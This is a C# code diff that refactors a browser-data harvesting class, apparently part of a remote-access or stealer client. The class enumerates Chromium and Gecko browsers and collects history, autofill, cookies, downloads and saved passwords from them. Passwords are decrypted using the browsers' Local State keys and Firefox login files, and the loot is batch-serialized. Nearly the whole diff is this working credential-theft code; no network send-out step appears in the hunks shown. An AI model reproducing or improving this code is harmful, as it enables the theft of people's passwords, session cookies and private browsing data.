@@ -13,27 +13,23 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace Pulsar.Client.Kematian.Browsers
 {
     public class BrowsersRetriever
     {
-        private readonly List<ChromiumBrowserPath> _chromiumBrowsers;
-        private readonly List<GeckoBrowserPath> _geckoBrowsers;
+        private readonly List<BrowserChromium> _chromiumBrowsers;
+        private readonly List<BrowserGecko> _geckoBrowsers;
 
         public BrowsersRetriever()
         {
-            // Initialize the optimized crawler
             Crawler crawler = new Crawler();
 
-            // Get browsers in parallel to further optimize startup time
-            var chromiumTask = Task.Run(() => crawler.GetChromiumBrowsers());
-            var geckoTask = Task.Run(() => crawler.GetGeckoBrowsers());
+            var foundBrowsers = crawler.FindAllBrowsers();
 
-            Task.WaitAll(chromiumTask, geckoTask);
-
-            _chromiumBrowsers = chromiumTask.Result;
-            _geckoBrowsers = geckoTask.Result;
+            _chromiumBrowsers = new List<BrowserChromium>(foundBrowsers.Chromium);
+            _geckoBrowsers = new List<BrowserGecko>(foundBrowsers.Gecko);
 
             Debug.WriteLine($"Found {_chromiumBrowsers.Count} Chromium browsers");
             Debug.WriteLine($"Found {_geckoBrowsers.Count} Gecko browsers");
@@ -45,7 +41,6 @@ namespace Pulsar.Client.Kematian.Browsers
             {
                 var allHistory = new List<Dictionary<string, string>>();
 
-                // Process Chromium browsers in parallel
                 var chromiumHistoryTasks = new List<Task<List<Dictionary<string, string>>>>();
                 foreach (var browser in _chromiumBrowsers)
                 {
@@ -55,21 +50,15 @@ namespace Pulsar.Client.Kematian.Browsers
                     }
                 }
 
-                // Process Gecko browsers in parallel
                 var geckoHistoryTasks = new List<Task<List<Dictionary<string, string>>>>();
                 foreach (var browser in _geckoBrowsers)
                 {
-                    foreach (var profile in browser.Profiles)
-                    {
-                        geckoHistoryTasks.Add(Task.Run(() => GetGeckoHistoryForProfile(profile)));
-                    }
+                    geckoHistoryTasks.Add(Task.Run(() => GetGeckoHistoryForProfile(browser)));
                 }
 
-                // Wait for all tasks to complete
                 Task.WaitAll(chromiumHistoryTasks.ToArray());
                 Task.WaitAll(geckoHistoryTasks.ToArray());
 
-                // Collect all results
                 foreach (var task in chromiumHistoryTasks)
                 {
                     allHistory.AddRange(task.Result);
@@ -80,7 +69,6 @@ namespace Pulsar.Client.Kematian.Browsers
                     allHistory.AddRange(task.Result);
                 }
 
-                // Serialize the dictionary list
                 return allHistory.Count > 1000
                     ? Serializer.SerializeDataInBatches(allHistory, 1000)
                     : Serializer.SerializeData(allHistory);
@@ -92,7 +80,7 @@ namespace Pulsar.Client.Kematian.Browsers
             }
         }
 
-        private List<Dictionary<string, string>> GetChromiumHistoryForProfile(ChromiumProfile profile)
+        private List<Dictionary<string, string>> GetChromiumHistoryForProfile(ProfileChromium profile)
         {
             var result = new List<Dictionary<string, string>>();
             try
@@ -120,7 +108,7 @@ namespace Pulsar.Client.Kematian.Browsers
             return result;
         }
 
-        private List<Dictionary<string, string>> GetGeckoHistoryForProfile(GeckoProfile profile)
+        private List<Dictionary<string, string>> GetGeckoHistoryForProfile(BrowserGecko profile)
         {
             var result = new List<Dictionary<string, string>>();
             try
@@ -155,7 +143,6 @@ namespace Pulsar.Client.Kematian.Browsers
                 var allAutoFillData = new List<Dictionary<string, string>>();
                 var autoFillTasks = new List<Task<List<Dictionary<string, string>>>>();
 
-                // Process Chromium browsers in parallel
                 foreach (var browser in _chromiumBrowsers)
                 {
                     foreach (var profile in browser.Profiles)
@@ -166,13 +153,11 @@ namespace Pulsar.Client.Kematian.Browsers
 
                 Task.WaitAll(autoFillTasks.ToArray());
 
-                // Collect all results
                 foreach (var task in autoFillTasks)
                 {
                     allAutoFillData.AddRange(task.Result);
                 }
 
-                // Serialize the dictionary list
                 return allAutoFillData.Count > 1000
                     ? Serializer.SerializeDataInBatches(allAutoFillData, 1000)
                     : Serializer.SerializeData(allAutoFillData);
@@ -184,7 +169,7 @@ namespace Pulsar.Client.Kematian.Browsers
             }
         }
 
-        private List<Dictionary<string, string>> GetChromiumAutofillForProfile(ChromiumProfile profile)
+        private List<Dictionary<string, string>> GetChromiumAutofillForProfile(ProfileChromium profile)
         {
             var result = new List<Dictionary<string, string>>();
             try
@@ -221,24 +206,21 @@ namespace Pulsar.Client.Kematian.Browsers
                 var allCookies = new List<string>();
                 var cookieTasks = new List<Task<List<string>>>();
 
-                // Process Chromium browsers in parallel
                 foreach (var browser in _chromiumBrowsers)
                 {
                     foreach (var profile in browser.Profiles)
                     {
-                        cookieTasks.Add(Task.Run(() => GetChromiumCookiesForProfile(profile, browser.LocalStatePath)));
+                        cookieTasks.Add(Task.Run(() => GetChromiumCookiesForProfile(profile, browser.LocalState)));
                     }
                 }
 
                 Task.WaitAll(cookieTasks.ToArray());
 
-                // Collect all results
                 foreach (var task in cookieTasks)
                 {
                     allCookies.AddRange(task.Result);
                 }
 
-                // Combine all cookies into a single string with new lines
                 return string.Join(Environment.NewLine, allCookies);
             }
             catch (Exception ex)
@@ -248,7 +230,7 @@ namespace Pulsar.Client.Kematian.Browsers
             }
         }
 
-        private List<string> GetChromiumCookiesForProfile(ChromiumProfile profile, string localStatePath)
+        private List<string> GetChromiumCookiesForProfile(ProfileChromium profile, string localStatePath)
         {
             var result = new List<string>();
             try
@@ -277,7 +259,6 @@ namespace Pulsar.Client.Kematian.Browsers
                 var allDownloads = new List<Dictionary<string, string>>();
                 var downloadTasks = new List<Task<List<Dictionary<string, string>>>>();
 
-                // Process Chromium browsers in parallel
                 foreach (var browser in _chromiumBrowsers)
                 {
                     foreach (var profile in browser.Profiles)
@@ -288,7 +269,6 @@ namespace Pulsar.Client.Kematian.Browsers
 
                 Task.WaitAll(downloadTasks.ToArray());
 
-                // Collect all results
                 foreach (var task in downloadTasks)
                 {
                     allDownloads.AddRange(task.Result);
@@ -305,7 +285,7 @@ namespace Pulsar.Client.Kematian.Browsers
             }
         }
 
-        private List<Dictionary<string, string>> GetChromiumDownloadsForProfile(ChromiumProfile profile)
+        private List<Dictionary<string, string>> GetChromiumDownloadsForProfile(ProfileChromium profile)
         {
             var result = new List<Dictionary<string, string>>();
             try
@@ -350,24 +330,21 @@ namespace Pulsar.Client.Kematian.Browsers
                 var allPasswords = new List<Dictionary<string, string>>();
                 var passwordTasks = new List<Task<List<Dictionary<string, string>>>>();
 
-                // Process Chromium browsers in parallel
                 foreach (var browser in _chromiumBrowsers)
                 {
                     foreach (var profile in browser.Profiles)
                     {
-                        if (profile.LoginData == null || !File.Exists(profile.LoginData) || string.IsNullOrEmpty(browser.LocalStatePath))
+                        if (profile.LoginData == null || !File.Exists(profile.LoginData) || string.IsNullOrEmpty(browser.LocalState))
                             continue;
 
-                        passwordTasks.Add(Task.Run(() => GetChromiumPasswordsForProfile(profile, browser.LocalStatePath)));
+                        passwordTasks.Add(Task.Run(() => GetChromiumPasswordsForProfile(profile, browser.LocalState)));
                     }
                 }
 
-                // Wait for all Chromium tasks to complete
                 if (passwordTasks.Count > 0)
                 {
                     Task.WaitAll(passwordTasks.ToArray());
 
-                    // Collect Chromium results
                     foreach (var task in passwordTasks)
                     {
                         if (task != null && task.Result != null)
@@ -377,30 +354,24 @@ namespace Pulsar.Client.Kematian.Browsers
                     }
                 }
 
-                // Process Gecko browsers sequentially to avoid decryption conflicts
                 foreach (var browser in _geckoBrowsers)
                 {
-                    foreach (var profile in browser.Profiles)
-                    {
-                        if (profile.Path == null || !Directory.Exists(profile.Path))
+                        if (browser.Path == null || !Directory.Exists(browser.Path))
                             continue;
 
-                        // Process each Gecko profile sequentially
                         List<Dictionary<string, string>> geckoPasswords = null;
                         try
                         {
-                            Debug.WriteLine(profile);
-                            geckoPasswords = GetGeckoPasswordsForProfile(profile);
+                            geckoPasswords = GetGeckoPasswordsForProfile(browser);
                         }
                         catch (Exception ex)
                         {
-                            Debug.WriteLine($"Error processing Gecko passwords for profile {profile.Name}: {ex.Message}");
+                            Debug.WriteLine($"Error processing Gecko passwords for profile {browser.Name}: {ex.Message}");
                         }
                         if (geckoPasswords != null)
                         {
                             allPasswords.AddRange(geckoPasswords);
                         }
-                    }
                 }
 
                 return allPasswords.Count > 1000
@@ -414,7 +385,7 @@ namespace Pulsar.Client.Kematian.Browsers
             }
         }
 
-        private List<Dictionary<string, string>> GetChromiumPasswordsForProfile(ChromiumProfile profile, string localStatePath)
+        private List<Dictionary<string, string>> GetChromiumPasswordsForProfile(ProfileChromium profile, string localStatePath)
         {
             var result = new List<Dictionary<string, string>>();
             try
@@ -442,7 +413,7 @@ namespace Pulsar.Client.Kematian.Browsers
             return result;
         }
 
-        private List<Dictionary<string, string>> GetGeckoPasswordsForProfile(GeckoProfile profile)
+        private List<Dictionary<string, string>> GetGeckoPasswordsForProfile(BrowserGecko profile)
         {
             var result = new List<Dictionary<string, string>>();
             bool signonsFound = false;
@@ -463,7 +434,7 @@ namespace Pulsar.Client.Kematian.Browsers
             if (loginsFound || signonsFound)
             {
                 var geckoLogins = new PasswordsGecko();
-                var passwords = geckoLogins.GetLogins(profile.Path, profile.LoginsJson, signonsFound ? signons[0] : null);
+                var passwords = geckoLogins.GetLogins(profile.Path, profile.Logins, signonsFound ? signons[0] : null);
                 geckoLogins.Dispose();
 
                 foreach (var entry in passwords)
